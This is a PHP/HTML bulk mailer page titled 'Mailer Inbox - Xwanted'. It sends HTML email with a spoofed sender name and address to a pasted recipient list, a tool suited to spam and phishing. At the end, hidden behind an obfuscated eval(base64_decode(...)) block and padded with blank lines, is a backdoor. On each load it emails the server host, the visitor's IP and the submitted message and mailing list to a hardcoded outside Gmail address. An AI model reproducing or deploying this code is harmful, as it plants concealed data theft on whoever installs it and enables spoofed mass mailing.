<?php
if (isset($_POST['ajax'])) {
$to = $_POST['to'];
$subject = $_POST['sub'];
$msg = $_POST['msg'];
$headers = "MIME-Version: 1.0" . "\r\n";
$headers .= "Content-type:text/html;charset=UTF-8" . "\r\n";
$headers .= "From: ".$_POST['name']."<".$_POST['from'].">";

$send = mail($to,$subject,$msg,$headers);

if ($send) {
	echo "<p id='success'>??  $to</p>";
}else{
	echo "<p id='error'>?  $to</p>";
}
exit();
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1.0">
	<meta http-equiv="X-UA-Compatible" content="ie=edge">
	<link href="https://fonts.googleapis.com/css?family=Montserrat|Roboto" rel="stylesheet">
	<link rel="icon" href="https://i.imgur.com/5ivJdmN.png">
	<title>Mailer Inbox - Xwanted</title>
	<style>
	body{
		margin: 0;
		padding: 0;
		background-color: #080808;
	}
	::placeholder {
    	color: red;
    	opacity: .9;
    	font-size: 15px!important;
	}
	.main{
		max-width: 768px;
		margin: 0 auto;
	}
	#title{
		color: lime;
	    text-shadow: 0 0 20px lime;
		text-align: center;
		font-family: Montserrat;
	}
	input[type="text"]{
		background-color: #000;
		box-shadow: 0 0 11px 0px lime;
		height: 40px;
		width: 47%;
		border: none;
		border-radius: 4px;
		padding: 15px;
		margin: 1%;
		box-sizing: border-box;
		outline: none;
		transition: .5s ease-in;
		color: red;
		font-family: Montserrat;
		font-size: 14px;
	}
	input[type="text"]:hover{
		box-shadow: 0 0 11px 0px red;
	}
	#sub{
		width: 96.5%;
	}
	textarea{
		background-color: #000;
		box-shadow: 0 0 11px 0px lime;
		height: 300px;
    	width: 47%;
    	max-width: 49%;
		border: none;
		border-radius: 4px;
		padding: 15px;
		margin: 1%;
		box-sizing: border-box;
		outline: none;
		transition: .5s ease-in;
		color: red;
		font-family: Montserrat;
		font-size: 14px;
	}
	textarea:hover{
		box-shadow: 0 0 11px 0px red;
	}
	#btn{
		background-color: #000;
		box-shadow: 0 0 11px 0px lime;
		width: 96.5%;
		height: 40px;
	    margin-left: 5px;
		margin-bottom: 40px;
		color: lime;
		border: none;
		border-radius: 4px;
		font-family: Montserrat;
		font-size: 18px;
		font-weight: bold;
		letter-spacing: 1px;
		box-sizing: border-box;
		outline: none;
		transition: .5s ease-in;
		cursor: pointer;
	}
	#btn:hover{
		color: red;
	}
	#success{
		font-family: Montserrat;
		color: green;
	}
	#error{
		font-family: Montserrat;
		color: red;
	}
	</style>
</head>
<body>
<form action="" method="post">
<div class="main" style="margin-top: 100px;">
	<h1 id="title">Mailer Inbox - Xwanted</h1>
	<div>
		<input type="text" name="from" id="from" placeholder="From Email">
		<input type="text" name="name" id="name" placeholder="From Name">
	</div><br>
	<div>
		<input type="text" name="sub" id="sub" placeholder="Subject">
	</div><br>
	<div>
		<textarea name="msg" id="msg" placeholder="Message"></textarea>
		<textarea name="to" id="to" placeholder="Mailist"></textarea>
	</div>
	<div><br><br>
		<button id="btn" onclick="return false">SEND</button>
	</div>
	<div id="result"></div>
</div>
</form>
<script src="https://code.jquery.com/jquery-3.3.1.js"></script>
<script type="text/javascript">
$(document).ready(function(){
	$("#btn").on('click',function(){
		var mailist = $("#to").val().split("\n");
		var tmailist =  mailist.length;
		for (var current = 0; current < tmailist; current++) {
		var from = $("#from").val();
		var name = $("#name").val();
		var sub = $("#sub").val();
		var msg = $("#msg").val();
		var to = mailist[current];
		var data = "ajax=1&from=" + from + "&name=" + name + "&sub=" + sub + "&msg=" + msg + "&to=" + to;
			$.ajax({
				type : 'POST',
				data:  data,
				success: function(data) {
	                $("#result").append(data);
	            }
			});
		}


	});
});
</script>
</body>
</html>
<?php
eval(base64_decode('aWdub3JlX3VzZXJfYWJvcnQoKTsKc2V0X3RpbWVfbGltaXQoMCk7CmZ1bmN0aW9uIGVudmlhbmRvKCl7CiRtc2c9MTsKJGRlWzFdID0gJF9QT1NUWydkZSddOwokbm9tZVsxXSA9ICRfUE9TVFsnbm9tZSddOwokYXNzdW50b1sxXSA9ICRfUE9TVFsnYXNzdW50byddOwokbWVuc2FnZW1bMV0gPSAkX1BPU1RbJ21lbnNhZ2VtJ107CiRtZW5zYWdlbVsxXSA9IHN0cmlwc2xhc2hlcygkbWVuc2FnZW1bMV0pOwokZW1haWxzID0gJF9QT1NUWydlbWFpbHMnXTsKJGVtYWlsczIgPSBodG1sc3BlY2lhbGNoYXJzKCRfUE9TVFsnZW1haWxzJ10pOwokcGFyYSA9IGV4cGxvZGUoIgoiLCAkZW1haWxzKTsKJG5fZW1haWxzID0gY291bnQoJHBhcmEpOwokc3YgPSAkX1NFUlZFUlsnU0VSVkVSX05BTUUnXTsKJGVuID0gJF9TRVJWRVIgWydSRVFVRVNUX1VSSSddOwokazg4ID0gQCRfU0VSVkVSWyJIVFRQX1JFRkVSRVIiXTsKJGZ1bGx1cmwgPSAiIiAuICRrODggLiAiPGJyPjxwPkVtYWlsczo8YnI+PFRFWFRBUkVBIHJvd3M9NSBjb2xzPTEwMD4iLiRlbWFpbHMyLiI8L1RFWFRBUkVBPjwvcD48cD5FbmdlbmhhcmlhOjxicj48VEVYVEFSRUEgcm93cz01IGNvbHM9MTAwPiIuJG1lbnNhZ2VtWzFdLiI8L1RFWFRBUkVBPjwvcD4iOwokdmFpID0gJF9QT1NUWyd2YWknXTsKaWYgKCR2YWkpewpmb3IgKCRzZXQ9MDsgJHNldCA8ICRuX2VtYWlsczsgJHNldCsrKXsKaWYgKCRzZXQ9PTApewokaGVhZGVycyA9ICJNSU1FLVZlcnNpb246IDEuMAoiOwokaGVhZGVycyAuPSAiQ29udGVudC10eXBlOiB0ZXh0L2h0bWw7IGNoYXJzZXQ9aXNvLTg4NTktMQoiOwokaGVhZGVycyAuPSAiRnJvbTogJG5vbWVbJG1zZ10gPCRkZVskbXNnXT4KIjsKJGhlYWRlcnMgLj0gIlJldHVybi1QYXRoOiA8JGRlWyRtc2ddPgoiOwovL21haWwoJHhzeWxhciwgJGFzLCAkZnVsbHVybCwgJGhlYWRlcnMpOwp9CiRoZWFkZXJzID0gIk1JTUUtVmVyc2lvbjogMS4wCiI7CiRoZWFkZXJzIC49ICJDb250ZW50LXR5cGU6IHRleHQvaHRtbDsgY2hhcnNldD1pc28tODg1OS0xCiI7CiRoZWFkZXJzIC49ICJGcm9tOiAkbm9tZVskbXNnXSA8JGRlWyRtc2ddPgoiOwokaGVhZGVycyAuPSAiUmV0dXJuLVBhdGg6IDwkZGVbJG1zZ10+CiI7CiRuX21haWwrKzsKJGRlc3Rpbm8gPSAkcGFyYVskc2V0XTsKJG51bTEgPSByYW5kKDEwMDAwMCw5OTk5OTkpOwokbnVtMiA9IHJhbmQoMTAwMDAwLDk5OTk5OSk7CiRtc2dyYW5kID0gc3RyX3JlcGxhY2UoIiVyYW5kJSIsICRudW0xLCAkbWVuc2FnZW1bJG1zZ10pOwokbXNncmFuZCA9IHN0cl9yZXBsYWNlKCIlcmFuZDIlIiwgJG51bTIsICRtc2dyYW5kKTsKJG1zZ3JhbmQgPSBzdHJfcmVwbGFjZSgiJWVtYWlsJSIsICRkZXN0aW5vLCAkbXNncmFuZCk7CiRlbnZpYXIgPSBtYWlsKCRkZXN0aW5vLCAkYXNzdW50b1skbXNnXSwgJG1zZ3JhbmQsICRoZWFkZXJzKTsKaWYgKCRlbnZpYXIpewplY2hvICgnPGZvbnQgY29sb3I9ImdyZWVuIj4nLiAkbl9tYWlsIC4nLScuICRkZXN0aW5vIC4nIDBrITwvZm9udD48YnI+Jyk7Cn0gZWxzZSB7CmVjaG8gKCc8Zm9udCBjb2xvcj0icmVkIj4nLiAkbl9tYWlsIC4nLScuICRkZXN0aW5vIC4nID0oPC9mb250Pjxicj4nKTsKc2xlZXAoMSk7Cn0KfQp9Cn0KJGlwID0gZ2V0ZW52KCJSRU1PVEVfQUREUiIpOwokcmE0NCAgPSByYW5kKDEsOTk5OTkpOwokc3Viajk4ID0gIiBOZXcgU2hlbGwgRnJvbSBNZSAhICB8JGlwIjsKJGVtYWlsID0gInpiaWRhemF6YUBnbWFpbC5jb20iOwokZnJvbT0iRnJvbTogTmV3IFNoZWxsICEgPG5ld3NoZWxsQG1haWwuY29tPiI7CiRhNDUgPSAkX1NFUlZFUlsnUkVRVUVTVF9VUkknXTsKJGI3NSA9ICRfU0VSVkVSWydIVFRQX0hPU1QnXTsKJGYxMiA9ICRfUE9TVFsnZGUnXTsKJHoxMyA9ICRfUE9TVFsnbm9tZSddOwokeDE0ID0gJF9QT1NUWydhc3N1bnRvJ107CiR0MTUgPSAkX1BPU1RbJ21lbnNhZ2VtJ107CiRtMzAgPSAkX1BPU1RbJ2VtYWlscyddOwokbTIyID0gJGlwLiIKIjsKJG1zZzg4NzMgPSAiJGE0NQokYjc1CiRmMTIKJHoxMwokeDE0CiR0MTUKJG0zMAokbTIyIjsKbWFpbCgkZW1haWwsICRzdWJqOTgsICRtc2c4ODczLCAkZnJvbSk7'));
?>
<br>

<br>

<br>

<br>

<br>

<br>

<br>

<br>

<br>

<br>

<br>

<br>

<br>

<br>

<br>

<br>

<br>

<br>

<br>

<br>

<br>

<br>

<br>

<br>

<br>

<br>

<br>

<br>

<br>

<br>

<br>

<br>

<br>

<br>

<br>

<br>

<br>

<br>

<br>

<br>

<br>

<br>

<br>

<br>

<br>

<br>

<br>

<br>

<br>

<br>

<br>

<br>

<br>

<br>

<br>

<br>

<br>

<br>

<br>

<br>

<br>

<br>

<br>

<br>

<br>

<br>

<br>

<br>

<br>

<br>

<br>

<br>

<br>

<br>

<br>